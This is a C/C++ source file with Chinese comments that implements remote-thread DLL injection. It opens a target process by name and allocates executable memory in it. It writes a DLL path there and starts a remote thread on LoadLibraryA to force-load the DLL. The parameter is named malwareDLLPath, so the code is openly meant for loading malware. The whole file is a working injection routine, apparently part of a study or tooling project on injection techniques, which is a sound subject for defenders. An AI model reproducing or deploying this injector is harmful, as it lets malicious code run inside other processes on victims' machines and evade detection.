#include "pch.h"
/**
 * 远程线程DLL注入
 * 参数   processName
 * 参数   malwareDLLPath
 */
VOID RemoteThreadInject(const TCHAR* processName, const TCHAR* malwareDLLPath)
{

	printf("\n【info】开始远程线程DLL注入...\n");
	//打开目标进程
	HANDLE hDestProcess = OpenProcessByName(processName, PROCESS_ALL_ACCESS);
	if (hDestProcess == 0)return;
	//合法性判断(1):确保当前进程和目标进程位数一致，才能以同地址远程调用目标进程LoadLibrary()
	BOOL is32BitProcess = TRUE;
	IsWow64Process(hDestProcess, &is32BitProcess);
#if _IS_X86 
	if (is32BitProcess == FALSE)
	{
		printf("【error】当前进程是32位，目标进程是64位...\n");
		return;
	}
#elif _IS_X64
	if (is32BitProcess == TRUE)
	{
		printf("【error】当前进程是64位，目标进程是32位...\n");
		return;
	}
#endif
	//合法性判断(2):32位的目标进程不能加载64位DLL;
	if (is32BitProcess == TRUE)
	{
		PBYTE pFileBuffer;
		PEHEADER PEHeader;
		PEBODY PEBody;
		LoadFileBuffer(malwareDLLPath, &pFileBuffer);
		AnalyzePE_ByFileBuffer(pFileBuffer, &PEHeader, &PEBody);
		if (PEHeader.COFFHeader.Size_Of_Optional_Headers == 0xF0)
		{
			printf("【error】目标进程是32位，无法加载64位DLL...");
			return;
		}
	}


	//获取当前进程中LoadLibraryA()函数地址
	HMODULE hKERNEL32 = GetModuleHandle(TEXT("KERNEL32.DLL"));
	LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKERNEL32, TEXT("LoadLibraryA"));
	if (pLoadLibrary == 0)
	{
		printf("【error】获取当前进程LoadLibraryA()函数地址失败... \n");
		return;
	}
	//为DLL名称字符串申请足够大的空间(100字节)，并写入目标进程
	LPVOID remoteAddr = VirtualAllocEx(hDestProcess, NULL, 100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (remoteAddr == NULL)
	{
		printf("【error】向目标进程申请空间失败，code=%d \n", GetLastError());
		return;
	}
	if (WriteProcessMemory(hDestProcess, (LPVOID)remoteAddr, (LPCVOID)malwareDLLPath, 100, OUT NULL) == 0)
	{
		DWORD CODE = GetLastError();
		printf("【error】向目标进程写入DLL名称字符串失败,CODE=%d \n", CODE);
		getchar();
		return;
	}
	//创建远程线程，调用目标进程内的LoadLibrary函数
	DWORD remoteThreadID = 0;
	HANDLE hRemoteThread = CreateRemoteThread(hDestProcess, NULL, 0, pLoadLibrary, (LPVOID)remoteAddr, 0, OUT &remoteThreadID);
	if (hRemoteThread == NULL)
	{
		printf("创建远程线程失败,CODE=%d (注意需编译为64位才可注入64位进程)\n", GetLastError());
		return;
	}
	printf("计算远程函数地址=%llX \n", pLoadLibrary);

	//等待远程线程结束
	printf("【info】创建远程线程成功：等待LoadLibraryA()结束...\n");
	WaitForSingleObject(hRemoteThread, INFINITE);
	DWORD exitCode;
	GetExitCodeThread(hRemoteThread, OUT &exitCode);//线程退出码，即LoadLibrary函数返回值，即注入的模块基址
	if (exitCode == 0)
	{
		printf("【error】注入失败：LoadLibrary返回的模块基址=0x0 ，可能是因为DLL路径错误 \n");
		CloseHandle(hRemoteThread);
		return;
	}
	printf("【info】注入成功：远程线程退出码(即LoadLibrary返回的模块基址)= %llX  \n", exitCode);
	CloseHandle(hRemoteThread);
	return;
}